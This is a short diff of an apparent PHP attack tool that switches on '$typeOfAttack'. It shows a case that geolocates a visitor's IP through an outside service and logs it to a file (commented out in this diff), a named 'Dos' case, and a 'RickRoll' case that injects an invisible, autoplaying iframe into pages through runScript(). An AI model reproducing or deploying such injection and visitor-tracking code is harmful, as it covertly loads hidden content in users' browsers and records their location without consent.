@@ -16,10 +16,10 @@ switch($typeOfAttack){
           getenv('HTTP_FORWARDED')?:
           getenv('REMOTE_ADDR');
           //depends on location / this ip for good result 12.215.42.19 ;
-           $data = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true")." Says <br>";
-           $logfile = fopen('../php/data.txt', 'a+');
-           fwrite($logfile, $data );
-           fclose($logfile);
+//           $data = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true")." Says <br>";
+//           $logfile = fopen('../php/data.txt', 'a+');
+//           fwrite($logfile, $data );
+//           fclose($logfile);
           runScript($textToInsert);
           break;
     case "Dos":
@@ -29,7 +29,8 @@ switch($typeOfAttack){
 
           break;
     case "RickRoll":
-          $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
+        
+          $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/07n4hliWkNs?autoplay1' frameborder='0'></iframe>";
           runScript($textToInsert);
 
           break;
